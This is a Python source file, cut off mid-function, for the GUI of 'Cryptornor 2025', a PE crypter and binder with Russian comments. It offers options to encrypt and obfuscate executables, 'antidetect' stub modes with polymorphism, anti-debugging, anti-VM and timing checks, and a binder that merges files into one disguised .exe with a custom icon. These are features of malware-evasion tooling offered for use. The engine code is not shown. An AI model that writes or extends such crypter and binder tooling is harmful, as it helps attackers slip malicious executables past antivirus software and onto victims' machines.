#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Main Window - Главное окно криптора с полным функционалом
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import customtkinter as ctk
import threading
import json
import os
from pathlib import Path
from typing import Dict, Any
import time
from datetime import datetime

class MainWindow:
    """Главное окно криптора"""
    
    def __init__(self, root: ctk.CTk, file_analyzer, cryptor_engine, binder_engine=None):
        self.root = root
        self.file_analyzer = file_analyzer
        self.cryptor_engine = cryptor_engine
        
        # BinderEngine (создаем, если не передан)
        if binder_engine:
            self.binder_engine = binder_engine
        else:
            from ..core.binder_engine import BinderEngine
            self.binder_engine = BinderEngine()
        
        self.current_file = None
        self.analysis_result = None
        
        # Настройка интерфейса
        self.setup_ui()
        self.setup_styles()
        
    def setup_ui(self):
        """Настройка интерфейса"""
        # Настройка главного окна
        self.root.title("🔐 Cryptornor 2025 - Advanced PE Cryptor & Binder")
        self.root.geometry("1500x1000")  # Увеличено окно
        self.root.minsize(1300, 900)     # Увеличен минимальный размер
        
        # Настройка темы
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        # Создание основного контейнера
        self.main_container = ctk.CTkFrame(self.root)
        self.main_container.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Настройка адаптивности
        self.main_container.grid_rowconfigure(2, weight=1)
        self.main_container.grid_columnconfigure(0, weight=1)
        
        # Создание элементов интерфейса
        self.create_header()
        self.create_file_panel()
        self.create_analysis_panel()
        self.create_cryptor_panel()
        self.create_log_panel()
        self.create_status_bar()
        self.setup_styles()
        
    def create_header(self):
        """Создание заголовка"""
        header_frame = ctk.CTkFrame(self.main_container)
        header_frame.pack(fill="x", padx=5, pady=5)
        
        # Основной заголовок
        title_label = ctk.CTkLabel(
            header_frame,
            text="🔐 Cryptornor 2025 - Advanced PE Cryptor",
            font=ctk.CTkFont(size=24, weight="bold")
        )
        title_label.pack(side="left", padx=10, pady=10)
        
        # Кнопка Binder
        binder_button = ctk.CTkButton(
            header_frame,
            text="📎 Binder",
            command=self.show_binder_info,
            width=150,
            height=30
        )
        binder_button.pack(side="right", padx=10, pady=10)
        
    def create_file_panel(self):
        """Создание панели выбора файла"""
        file_frame = ctk.CTkFrame(self.main_container)
        file_frame.pack(fill="x", padx=5, pady=5)
        
        # Заголовок панели
        file_title = ctk.CTkLabel(
            file_frame,
            text="📁 Выбор файла для криптования",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        file_title.pack(anchor="w", padx=10, pady=(10, 5))
        
        # Панель выбора файла
        file_select_frame = ctk.CTkFrame(file_frame)
        file_select_frame.pack(fill="x", padx=10, pady=5)
        
        # Настройка адаптивности
        file_select_frame.grid_columnconfigure(0, weight=1)
        file_select_frame.grid_columnconfigure(1, weight=0)
        
        # Поле пути к файлу
        self.file_path_var = tk.StringVar()
        self.file_path_entry = ctk.CTkEntry(
            file_select_frame,
            textvariable=self.file_path_var,
            placeholder_text="Выберите .exe или .dll файл для криптования...",
            height=35
        )
        self.file_path_entry.grid(row=0, column=0, sticky="ew", padx=(0, 10))
        
        # Кнопка выбора файла
        self.browse_button = ctk.CTkButton(
            file_select_frame,
            text="Обзор",
            command=self.browse_file,
            width=100,
            height=35
        )
        self.browse_button.grid(row=0, column=1, sticky="e")
        
        # Кнопка анализа
        self.analyze_button = ctk.CTkButton(
            file_frame,
            text="🔍 Анализировать файл",
            command=self.analyze_file,
            height=35,
            fg_color="#FF6B35",
            hover_color="#E55A2B"
        )
        self.analyze_button.pack(pady=10)
        
    def create_analysis_panel(self):
        """Создание панели анализа"""
        analysis_frame = ctk.CTkFrame(self.main_container)
        analysis_frame.pack(fill="x", padx=5, pady=5)  # Изменено на fill="x" чтобы не растягивалось
        
        # Заголовок
        analysis_title = ctk.CTkLabel(
            analysis_frame,
            text="📊 Анализ файла",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        analysis_title.pack(anchor="w", padx=10, pady=(10, 5))
        
        # Создание notebook для вкладок с ограниченной высотой
        self.analysis_notebook = ttk.Notebook(analysis_frame, height=300)  # Ограничиваем высоту
        self.analysis_notebook.pack(fill="x", padx=10, pady=5)
        
        # Вкладка общей информации
        self.create_general_info_tab()
        
        # Вкладка PE информации
        self.create_pe_info_tab()
        
        # Вкладка зависимостей
        self.create_dependencies_tab()
        
        # Вкладка секций
        self.create_sections_tab()
        
        # Вкладка безопасности
        self.create_security_tab()
        
        # Вкладка Binder
        self.create_binder_tab()
        
    def create_general_info_tab(self):
        """Создание вкладки общей информации"""
        general_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(general_frame, text="Общая информация")
        
        # Настройка адаптивности
        general_frame.grid_rowconfigure(0, weight=1)
        general_frame.grid_columnconfigure(0, weight=1)
        
        # Создание текстового виджета с прокруткой
        self.general_text = scrolledtext.ScrolledText(
            general_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#2B2B2B",
            fg="#FFFFFF",
            insertbackground="#FFFFFF"
        )
        self.general_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
    def create_pe_info_tab(self):
        """Создание вкладки PE информации"""
        pe_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(pe_frame, text="PE информация")
        
        # Настройка адаптивности
        pe_frame.grid_rowconfigure(0, weight=1)
        pe_frame.grid_columnconfigure(0, weight=1)
        
        self.pe_text = scrolledtext.ScrolledText(
            pe_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#2B2B2B",
            fg="#FFFFFF",
            insertbackground="#FFFFFF"
        )
        self.pe_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
    def create_dependencies_tab(self):
        """Создание вкладки зависимостей"""
        deps_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(deps_frame, text="Зависимости")
        
        # Настройка адаптивности
        deps_frame.grid_rowconfigure(0, weight=1)
        deps_frame.grid_columnconfigure(0, weight=1)
        
        self.deps_text = scrolledtext.ScrolledText(
            deps_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#2B2B2B",
            fg="#FFFFFF",
            insertbackground="#FFFFFF"
        )
        self.deps_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
    def create_sections_tab(self):
        """Создание вкладки секций"""
        sections_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(sections_frame, text="Секции")
        
        # Настройка адаптивности
        sections_frame.grid_rowconfigure(0, weight=1)
        sections_frame.grid_columnconfigure(0, weight=1)
        
        self.sections_text = scrolledtext.ScrolledText(
            sections_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#2B2B2B",
            fg="#FFFFFF",
            insertbackground="#FFFFFF"
        )
        self.sections_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
    def create_security_tab(self):
        """Создание вкладки безопасности"""
        security_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(security_frame, text="Безопасность")
        
        # Настройка адаптивности
        security_frame.grid_rowconfigure(0, weight=1)
        security_frame.grid_columnconfigure(0, weight=1)
        
        self.security_text = scrolledtext.ScrolledText(
            security_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#2B2B2B",
            fg="#FFFFFF",
            insertbackground="#FFFFFF"
        )
        self.security_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
    def create_binder_tab(self):
        """Создание вкладки Binder"""
        binder_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(binder_frame, text="📎 Binder")
        
        # Настройка адаптивности
        binder_frame.grid_rowconfigure(1, weight=1)
        binder_frame.grid_columnconfigure(0, weight=1)
        
        # Заголовок Binder
        binder_title = ctk.CTkLabel(
            binder_frame,
            text="📎 File Binder - Склейка файлов и установка иконки",
            font=ctk.CTkFont(size=14, weight="bold")
        )
        binder_title.grid(row=0, column=0, sticky="w", padx=10, pady=(10, 5))
        
        # Основной контейнер для Binder
        binder_container = ctk.CTkFrame(binder_frame)
        binder_container.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        
        # Настройка сетки
        binder_container.grid_columnconfigure(0, weight=1)
        binder_container.grid_columnconfigure(1, weight=1)
        binder_container.grid_rowconfigure(1, weight=1)
        
        # Левая панель - добавление файлов
        self.create_binder_files_panel(binder_container)
        
        # Правая панель - настройки и иконка
        self.create_binder_settings_panel(binder_container)
        
        # Нижняя панель - список файлов и кнопки
        self.create_binder_list_panel(binder_container)
    
    def create_binder_files_panel(self, parent):
        """Создание панели добавления файлов"""
        files_frame = ctk.CTkFrame(parent)
        files_frame.grid(row=0, column=0, sticky="nsew", padx=(0, 5), pady=5)
        
        # Заголовок
        files_title = ctk.CTkLabel(
            files_frame,
            text="📁 Добавление файлов",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        files_title.pack(anchor="w", padx=10, pady=(10, 5))
        
        # Кнопка добавления файла
        add_file_btn = ctk.CTkButton(
            files_frame,
            text="➕ Добавить файл",
            command=self.add_file_to_binder,
            width=150,
            height=35
        )
        add_file_btn.pack(pady=5)
        
        # Кнопка добавления папки
        add_folder_btn = ctk.CTkButton(
            files_frame,
            text="📁 Добавить папку",
            command=self.add_folder_to_binder,
            width=150,
            height=35
        )
        add_folder_btn.pack(pady=5)
        
        # Кнопка очистки
        clear_btn = ctk.CTkButton(
            files_frame,
            text="🗑️ Очистить список",
            command=self.clear_binder_files,
            width=150,
            height=35,
            fg_color="#FF4444",
            hover_color="#CC3333"
        )
        clear_btn.pack(pady=5)
    
    def create_binder_settings_panel(self, parent):
        """Создание панели настроек Binder"""
        settings_frame = ctk.CTkFrame(parent)
        settings_frame.grid(row=0, column=1, sticky="nsew", padx=(5, 0), pady=5)
        
        # Заголовок
        settings_title = ctk.CTkLabel(
            settings_frame,
            text="⚙️ Настройки",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        settings_title.pack(anchor="w", padx=10, pady=(10, 5))
        
        # Режим выполнения
        exec_label = ctk.CTkLabel(settings_frame, text="Режим выполнения:")
        exec_label.pack(anchor="w", padx=10, pady=2)
        
        self.execution_mode_var = tk.StringVar(value="parallel")
        exec_combo = ctk.CTkOptionMenu(
            settings_frame,
            variable=self.execution_mode_var,
            values=["parallel", "sequential"],
            width=150
        )
        exec_combo.pack(pady=2)
        
        # Иконка
        icon_label = ctk.CTkLabel(settings_frame, text="Иконка:")
        icon_label.pack(anchor="w", padx=10, pady=(10, 2))
        
        icon_frame = ctk.CTkFrame(settings_frame)
        icon_frame.pack(fill="x", padx=10, pady=2)
        
        self.icon_path_var = tk.StringVar()
        icon_entry = ctk.CTkEntry(
            icon_frame,
            textvariable=self.icon_path_var,
            placeholder_text="Выберите .ico файл...",
            height=30
        )
        icon_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        icon_btn = ctk.CTkButton(
            icon_frame,
            text="📁",
            command=self.browse_icon,
            width=40,
            height=30
        )
        icon_btn.pack(side="right")
        
        # Имя выходного файла
        output_label = ctk.CTkLabel(settings_frame, text="Имя выходного файла:")
        output_label.pack(anchor="w", padx=10, pady=(10, 2))
        
        self.output_name_var = tk.StringVar(value="binded_file.exe")
        output_entry = ctk.CTkEntry(
            settings_frame,
            textvariable=self.output_name_var,
            height=30
        )
        output_entry.pack(fill="x", padx=10, pady=2)
    
    def create_binder_list_panel(self, parent):
        """Создание панели списка файлов"""
        list_frame = ctk.CTkFrame(parent)
        list_frame.grid(row=1, column=0, columnspan=2, sticky="nsew", pady=(5, 0))
        
        # Заголовок
        list_title = ctk.CTkLabel(
            list_frame,
            text="📋 Список файлов для склейки",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        list_title.pack(anchor="w", padx=10, pady=(10, 5))
        
        # Создание Treeview для списка файлов
        columns = ("Имя", "Путь", "Размер", "Порядок", "Скрытый")
        self.files_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=8)
        
        # Настройка колонок
        self.files_tree.heading("Имя", text="Имя файла")
        self.files_tree.heading("Путь", text="Путь")
        self.files_tree.heading("Размер", text="Размер")
        self.files_tree.heading("Порядок", text="Порядок")
        self.files_tree.heading("Скрытый", text="Скрытый")
        
        self.files_tree.column("Имя", width=150)
        self.files_tree.column("Путь", width=300)
        self.files_tree.column("Размер", width=100)
        self.files_tree.column("Порядок", width=80)
        self.files_tree.column("Скрытый", width=80)
        
        # Скроллбары
        tree_scroll_y = ttk.Scrollbar(list_frame, orient="vertical", command=self.files_tree.yview)
        tree_scroll_x = ttk.Scrollbar(list_frame, orient="horizontal", command=self.files_tree.xview)
        self.files_tree.configure(yscrollcommand=tree_scroll_y.set, xscrollcommand=tree_scroll_x.set)
        
        # Размещение
        self.files_tree.pack(side="left", fill="both", expand=True, padx=(10, 0), pady=5)
        tree_scroll_y.pack(side="right", fill="y", pady=5)
        tree_scroll_x.pack(side="bottom", fill="x", padx=(10, 0))
        
        # Кнопки управления
        buttons_frame = ctk.CTkFrame(list_frame)
        buttons_frame.pack(fill="x", padx=10, pady=5)
        
        remove_btn = ctk.CTkButton(
            buttons_frame,
            text="🗑️ Удалить выбранный",
            command=self.remove_selected_file,
            width=150,
            height=35
        )
        remove_btn.pack(side="left", padx=5)
        
        self.bind_files_btn = ctk.CTkButton(
            buttons_frame,
            text="🔗 Склеить файлы",
            command=self.bind_files,
            width=150,
            height=35,
            fg_color="#00FF00",
            hover_color="#00CC00"
        )
        self.bind_files_btn.pack(side="right", padx=5)
    
    def add_file_to_binder(self):
        """Добавить файл в Binder"""
        file_path = filedialog.askopenfilename(
            title="Выберите файл для добавления",
            filetypes=[("Все файлы", "*.*")]
        )
        
        if file_path:
            # Получаем информацию о файле
            file_info = Path(file_path)
            if file_info.exists():
                # Добавляем в BinderEngine
                success = self.binder_engine.add_file(file_path)
                if success:
                    # Добавляем в Treeview
                    size = self._format_size(file_info.stat().st_size)
                    self.files_tree.insert("", "end", values=(
                        file_info.name,
                        str(file_info),
                        size,
                        0,  # порядок
                        "Нет"  # скрытый
                    ))
                    self.log_message(f"✅ Добавлен файл: {file_info.name}")
                else:
                    messagebox.showerror("Ошибка", f"Не удалось добавить файл: {file_info.name}")
    
    def add_folder_to_binder(self):
        """Добавить папку в Binder"""
        folder_path = filedialog.askdirectory(title="Выберите папку для добавления")
        
        if folder_path:
            folder = Path(folder_path)
            added_count = 0
            
            for file_path in folder.rglob("*"):
                if file_path.is_file():
                    success = self.binder_engine.add_file(str(file_path))
                    if success:
                        size = self._format_size(file_path.stat().st_size)
                        self.files_tree.insert("", "end", values=(
                            file_path.name,
                            str(file_path),
                            size,
                            0,
                            "Нет"
                        ))
                        added_count += 1
            
            self.log_message(f"✅ Добавлено файлов из папки: {added_count}")
    
    def remove_selected_file(self):
        """Удалить выбранный файл из списка"""
        selected = self.files_tree.selection()
        if selected:
            item = self.files_tree.item(selected[0])
            file_name = item['values'][0]
            
            # Удаляем из Treeview
            self.files_tree.delete(selected[0])
            
            # Удаляем из BinderEngine
            self.binder_engine.files_to_bind = [
                f for f in self.binder_engine.files_to_bind 
                if f["name"] != file_name
            ]
            
            self.log_message(f"🗑️ Удален файл: {file_name}")
    
    def clear_binder_files(self):
        """Очистить список файлов"""
        self.files_tree.delete(*self.files_tree.get_children())
        self.binder_engine.clear_files()
        self.log_message("🗑️ Список файлов очищен")
    
    def browse_icon(self):
        """Выбрать иконку"""
        icon_path = filedialog.askopenfilename(
            title="Выберите иконку (.ico)",
            filetypes=[("ICO файлы", "*.ico")]
        )
        
        if icon_path:
            self.icon_path_var.set(icon_path)
            self.binder_engine.set_icon(icon_path)
            self.log_message(f"✅ Установлена иконка: {Path(icon_path).name}")
    
    def bind_files(self):
        """Склеить файлы"""
        if not self.binder_engine.files_to_bind:
            messagebox.showwarning("Предупреждение", "Добавьте файлы для склейки!")
            return
        
        # Настройки
        self.binder_engine.set_execution_mode(self.execution_mode_var.get())
        
        # Путь для сохранения
        output_path = filedialog.asksaveasfilename(
            title="Сохранить склеенный файл",
            defaultextension=".exe",
            filetypes=[("EXE файлы", "*.exe")]
        )
        
        if output_path:
            self.bind_files_btn.configure(state="disabled", text="Склеиваю...")
            self.status_bar.configure(text="Склеиваю файлы...")
            
            # Запуск в отдельном потоке
            thread = threading.Thread(target=self._bind_files_thread, args=(output_path,))
            thread.daemon = True
            thread.start()
    
    def _bind_files_thread(self, output_path):
        """Поток склейки файлов"""
        try:
            self.log_message("🔗 Начинаю склейку файлов...")
            
            result = self.binder_engine.bind_files(output_path)
            
            if result.get("success", False):
                self.log_message("✅ Склейка завершена успешно!")
                self.log_message(f"📁 Выходной файл: {result.get('output_file', 'N/A')}")
                self.log_message(f"📊 Файлов склеено: {result.get('files_count', 0)}")
                self.log_message(f"📏 Общий размер: {result.get('total_size', 0):,} байт")
                self.log_message(f"⚙️ Режим выполнения: {result.get('execution_mode', 'N/A')}")
                
                self.root.after(0, lambda: messagebox.showinfo(
                    "Успех",
                    f"Файлы успешно склеены!\n\n"
                    f"Выходной файл: {result.get('output_file', 'N/A')}\n"
                    f"Файлов: {result.get('files_count', 0)}\n"
                    f"Размер: {result.get('total_size', 0):,} байт\n"
                    f"Режим: {result.get('execution_mode', 'N/A')}"
                ))
            else:
                error_msg = result.get("error", "Неизвестная ошибка")
                self.log_message(f"❌ Ошибка склейки: {error_msg}")
                self.root.after(0, lambda: messagebox.showerror("Ошибка", f"Ошибка склейки: {error_msg}"))
                
        except Exception as e:
            self.log_message(f"❌ Ошибка склейки: {e}")
            self.root.after(0, lambda: messagebox.showerror("Ошибка", f"Ошибка склейки: {e}"))
        finally:
            self.root.after(0, self._finish_binding)
    
    def _finish_binding(self):
        """Завершение склейки"""
        self.bind_files_btn.configure(state="normal", text="🔗 Склеить файлы")
        self.status_bar.configure(text="Готов к работе")
    
    def create_cryptor_panel(self):
        """Создание панели настроек криптора"""
        cryptor_frame = ctk.CTkFrame(self.main_container)
        cryptor_frame.pack(fill="x", padx=5, pady=5)
        
        # Заголовок
        cryptor_title = ctk.CTkLabel(
            cryptor_frame,
            text="🔒 Настройки криптования",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        cryptor_title.pack(anchor="w", padx=10, pady=(10, 5))
        
        # НОВАЯ ПАНЕЛЬ: Выбор режимов стаба
        self.create_stub_mode_panel(cryptor_frame)
        
        # Создание настроек в адаптивном контейнере
        settings_container = ctk.CTkFrame(cryptor_frame)
        settings_container.pack(fill="x", padx=10, pady=5)
        
        # Настройка сетки для адаптивности
        settings_container.grid_columnconfigure(0, weight=1)
        settings_container.grid_columnconfigure(1, weight=1)
        settings_container.grid_columnconfigure(2, weight=1)
        
        # Левая колонка - шифрование
        self.create_encryption_settings(settings_container, 0)
        
        # Средняя колонка - обфускация
        self.create_obfuscation_settings(settings_container, 1)
        
        # Правая колонка - анти-анализ
        self.create_anti_analysis_settings(settings_container, 2)
        
        # Кнопка криптования
        self.crypt_button = ctk.CTkButton(
            cryptor_frame,
            text="🚀 Начать криптование",
            command=self.start_crypting,
            height=40,
            fg_color="#00FF00",
            hover_color="#00CC00",
            font=ctk.CTkFont(size=14, weight="bold")
        )
        self.crypt_button.pack(pady=10)
        
    def create_stub_mode_panel(self, parent):
        """Компактная панель выбора режимов стаба"""
        stub_frame = ctk.CTkFrame(parent)
        stub_frame.pack(fill="x", padx=5, pady=2)

        # Заголовок
        stub_title = ctk.CTkLabel(
            stub_frame,
            text="🎯 Режим стаба (антидетект):",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        stub_title.pack(anchor="w", padx=5, pady=(4, 2))

        # Режимы в одну строку
        modes_row = ctk.CTkFrame(stub_frame)
        modes_row.pack(fill="x", padx=5, pady=2)

        # Массив режимов и описаний
        stub_modes = [
            ("🟢 DEFAULT", "Минимум защиты"),
            ("🟡 STEALTH", "Полиморфизм, анти-отладка"),
            ("🔴 ULTRA", "AES+XOR, анти-анализ")
        ]
        for i, (icon, desc) in enumerate(stub_modes):
            mode_col = ctk.CTkFrame(modes_row)
            mode_col.grid(row=0, column=i, sticky="nsew", padx=2, pady=0)
            mode_label = ctk.CTkLabel(mode_col, text=icon, font=ctk.CTkFont(size=12, weight="bold"))
            mode_label.pack()
            mode_desc = ctk.CTkLabel(mode_col, text=desc, font=ctk.CTkFont(size=9), text_color="#888888")
            mode_desc.pack()
            modes_row.grid_columnconfigure(i, weight=1)

        # Выбор режима и кнопка в одну строку
        select_row = ctk.CTkFrame(stub_frame)
        select_row.pack(fill="x", padx=5, pady=2)
        mode_label = ctk.CTkLabel(select_row, text="Выбрать:", font=ctk.CTkFont(size=11))
        mode_label.pack(side="left", padx=2)
        self.stub_mode_var = tk.StringVar(value="DEFAULT")
        mode_combo = ctk.CTkOptionMenu(
            select_row,
            variable=self.stub_mode_var,
            values=["DEFAULT", "STEALTH", "ULTRA"],
            width=110,
            command=self.on_stub_mode_changed
        )
        mode_combo.pack(side="left", padx=2)
        # Информация о режиме
        self.stub_info_label = ctk.CTkLabel(
            select_row,
            text="Режим DEFAULT: Стандартное XOR шифрование",
            font=ctk.CTkFont(size=9),
            text_color="#00FF00"
        )
        self.stub_info_label.pack(side="left", padx=8)
        
    def on_stub_mode_changed(self, value):
        """Обработчик изменения режима стаба"""
        mode_info = {
            "DEFAULT": "Режим DEFAULT: Стандартное XOR шифрование без дополнительной защиты",
            "STEALTH": "Режим STEALTH: Полиморфное XOR + Анти-отладка + Скрытие в памяти",
            "ULTRA": "Режим ULTRA: AES-256 + XOR + Полная обфускация + Анти-VM + Анти-анализ"
        }
        
        self.stub_info_label.configure(text=mode_info.get(value, ""))
        self.log_message(f"🎯 Выбран режим стаба: {value}")
        
        # Обновляем настройки в зависимости от режима
        if value == "DEFAULT":
            self.encryption_var.set("XOR-Polymorphic")
            self.obfuscation_var.set("MINIMAL")
            self.string_encryption_var.set(False)
            self.import_obfuscation_var.set(False)
            self.junk_code_var.set(False)
            self.anti_debug_var.set(False)
            self.anti_vm_var.set(False)
            self.timing_analysis_var.set(False)
            self.polymorphic_var.set(False)
        elif value == "STEALTH":
            self.encryption_var.set("XOR-Polymorphic")
            self.obfuscation_var.set("HIGH")
            self.string_encryption_var.set(True)
            self.import_obfuscation_var.set(True)
            self.junk_code_var.set(True)
            self.anti_debug_var.set(True)
            self.anti_vm_var.set(False)
            self.timing_analysis_var.set(False)
            self.polymorphic_var.set(True)
        elif value == "ULTRA":
            self.encryption_var.set("AES-256-GCM")
            self.obfuscation_var.set("MAXIMUM")
            self.string_encryption_var.set(True)
            self.import_obfuscation_var.set(True)
            self.junk_code_var.set(True)
            self.anti_debug_var.set(True)
            self.anti_vm_var.set(True)
            self.timing_analysis_var.set(True)
            self.polymorphic_var.set(True)
        
    def create_encryption_settings(self, parent, column):
        """Создание настроек шифрования"""
        encryption_frame = ctk.CTkFrame(parent)
        encryption_frame.grid(row=0, column=column, sticky="nsew", padx=5, pady=5)
        
        # Настройка адаптивности
        encryption_frame.grid_columnconfigure(0, weight=1)
        
        # Заголовок
        enc_title = ctk.CTkLabel(
            encryption_frame,
            text="🔐 Алгоритм шифрования:",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        enc_title.grid(row=0, column=0, sticky="w", padx=5, pady=2)
        
        # Выбор алгоритма
        self.encryption_var = tk.StringVar(value="XOR-Polymorphic")
        encryption_combo = ctk.CTkOptionMenu(
            encryption_frame,
            variable=self.encryption_var,
            values=["AES-256-GCM", "ChaCha20-Poly1305", "AES-256-CBC", "XOR-Polymorphic"],
            width=200
        )
        encryption_combo.grid(row=1, column=0, sticky="w", padx=5, pady=2)
        
    def create_obfuscation_settings(self, parent, column):
        """Создание настроек обфускации"""
        obfuscation_frame = ctk.CTkFrame(parent)
        obfuscation_frame.grid(row=0, column=column, sticky="nsew", padx=5, pady=5)
        
        # Настройка адаптивности
        obfuscation_frame.grid_columnconfigure(0, weight=1)
        
        # Заголовок
        obf_title = ctk.CTkLabel(
            obfuscation_frame,
            text="🔄 Уровень обфускации:",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        obf_title.grid(row=0, column=0, sticky="w", padx=5, pady=2)
        
        # Выбор уровня
        self.obfuscation_var = tk.StringVar(value="MAXIMUM")
        obfuscation_combo = ctk.CTkOptionMenu(
            obfuscation_frame,
            variable=self.obfuscation_var,
            values=["MINIMAL", "MEDIUM", "HIGH", "MAXIMUM"],
            width=200
        )
        obfuscation_combo.grid(row=1, column=0, sticky="w", padx=5, pady=2)
        
        # Чекбоксы обфускации
        self.string_encryption_var = tk.BooleanVar(value=True)
        string_check = ctk.CTkCheckBox(
            obfuscation_frame,
            text="Шифрование строк",
            variable=self.string_encryption_var
        )
        string_check.grid(row=2, column=0, sticky="w", padx=5, pady=2)
        
        self.import_obfuscation_var = tk.BooleanVar(value=True)
        import_check = ctk.CTkCheckBox(
            obfuscation_frame,
            text="Обфускация импортов",
            variable=self.import_obfuscation_var
        )
        import_check.grid(row=3, column=0, sticky="w", padx=5, pady=2)
        
        self.junk_code_var = tk.BooleanVar(value=True)
        junk_check = ctk.CTkCheckBox(
            obfuscation_frame,
            text="Инжекция мусорного кода",
            variable=self.junk_code_var
        )
        junk_check.grid(row=4, column=0, sticky="w", padx=5, pady=2)
        
    def create_anti_analysis_settings(self, parent, column):
        """Создание настроек анти-анализа"""
        anti_frame = ctk.CTkFrame(parent)
        anti_frame.grid(row=0, column=column, sticky="nsew", padx=5, pady=5)
        
        # Настройка адаптивности
        anti_frame.grid_columnconfigure(0, weight=1)
        
        # Заголовок
        anti_title = ctk.CTkLabel(
            anti_frame,
            text="🛡️ Анти-анализ:",
            font=ctk.CTkFont(size=12, weight="bold")
        )
        anti_title.grid(row=0, column=0, sticky="w", padx=5, pady=2)
        
        # Чекбоксы анти-анализа
        self.anti_debug_var = tk.BooleanVar(value=True)
        debug_check = ctk.CTkCheckBox(
            anti_frame,
            text="Детект отладчика",
            variable=self.anti_debug_var
        )
        debug_check.grid(row=1, column=0, sticky="w", padx=5, pady=2)
        
        self.anti_vm_var = tk.BooleanVar(value=True)
        vm_check = ctk.CTkCheckBox(
            anti_frame,
            text="Детект виртуальной машины",
            variable=self.anti_vm_var
        )
        vm_check.grid(row=2, column=0, sticky="w", padx=5, pady=2)
        
        self.timing_analysis_var = tk.BooleanVar(value=True)
        timing_check = ctk.CTkCheckBox(
            anti_frame,
            text="Timing-анализ",
            variable=self.timing_analysis_var
        )
        timing_check.grid(row=3, column=0, sticky="w", padx=5, pady=2)
        
        self.polymorphic_var = tk.BooleanVar(value=True)
        poly_check = ctk.CTkCheckBox(
            anti_frame,
            text="Полиморфный код",
            variable=self.polymorphic_var
        )
        poly_check.grid(row=4, column=0, sticky="w", padx=5, pady=2)
        
    def create_log_panel(self):
        """Создание панели логов"""
        log_frame = ctk.CTkFrame(self.main_container)
        log_frame.pack(fill="both", expand=True, padx=5, pady=5)  # Изменено на expand=True
        
        # Заголовок с кнопками управления
        log_header = ctk.CTkFrame(log_frame)
        log_header.pack(fill="x", padx=5, pady=5)
        
        log_title = ctk.CTkLabel(
            log_header,
            text="📝 Лог операций",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        log_title.pack(side="left", padx=10, pady=5)
        
        # Кнопка очистки логов
        clear_log_btn = ctk.CTkButton(
            log_header,
            text="🗑️ Очистить",
            command=self.clear_logs,
            width=100,
            height=30,
            fg_color="#FF4444",
            hover_color="#CC3333"
        )
        clear_log_btn.pack(side="right", padx=10, pady=5)
        
        # Кнопка сохранения логов
        save_log_btn = ctk.CTkButton(
            log_header,
            text="💾 Сохранить",
            command=self.save_logs,
            width=100,
            height=30
        )
        save_log_btn.pack(side="right", padx=5, pady=5)
        
        # Текстовое поле для логов с адаптивностью
        log_container = ctk.CTkFrame(log_frame)
        log_container.pack(fill="both", expand=True, padx=5, pady=5)  # Изменено на expand=True
        
        # Настройка адаптивности
        log_container.grid_rowconfigure(0, weight=1)
        log_container.grid_columnconfigure(0, weight=1)
        
        self.log_text = scrolledtext.ScrolledText(
            log_container,
            height=15,  # Увеличена высота с 8 до 15
            wrap=tk.WORD,
            font=("Consolas", 10),  # Увеличен размер шрифта с 9 до 10
            bg="#1A1A1A",  # Более темный фон
            fg="#00FF00",  # Зеленый текст
            insertbackground="#FFFFFF",
            selectbackground="#444444",  # Цвет выделения
            selectforeground="#FFFFFF"
        )
        self.log_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
        # Настройка цветов для разных типов сообщений
        self.log_text.tag_configure("success", foreground="#00FF00")  # Зеленый для успеха
        self.log_text.tag_configure("error", foreground="#FF4444")    # Красный для ошибок
        self.log_text.tag_configure("warning", foreground="#FFAA00")  # Оранжевый для предупреждений
        self.log_text.tag_configure("info", foreground="#00AAFF")     # Синий для информации
        self.log_text.tag_configure("debug", foreground="#888888")    # Серый для отладки
        
        # Добавляем начальное сообщение
        self.log_message("🚀 Cryptornor 2025 запущен")
        self.log_message("📝 Логи операций будут отображаться здесь")
        self.log_message("💡 Используйте кнопки 'Очистить' и 'Сохранить' для управления логами")
        
    def create_status_bar(self):
        """Создание статус бара"""
        self.status_bar = ctk.CTkLabel(
            self.main_container,
            text="Готов к работе",
            font=ctk.CTkFont(size=10),
            text_color="#888888"
        )
        self.status_bar.pack(side="bottom", anchor="w", padx=10, pady=5)
        
    def setup_styles(self):
        """Настройка стилей"""
        # Настройка цветов для ttk
        style = ttk.Style()
        style.theme_use('clam')
        
        # Настройка цветов для notebook
        style.configure('TNotebook', background='#2B2B2B')
        style.configure('TNotebook.Tab', background='#3B3B3B', foreground='white')
        style.map('TNotebook.Tab', background=[('selected', '#4B4B4B')])
        
    def browse_file(self):
        """Выбор файла"""
        file_path = filedialog.askopenfilename(
            title="Выберите файл для криптования",
            filetypes=[
                ("Executable files", "*.exe"),
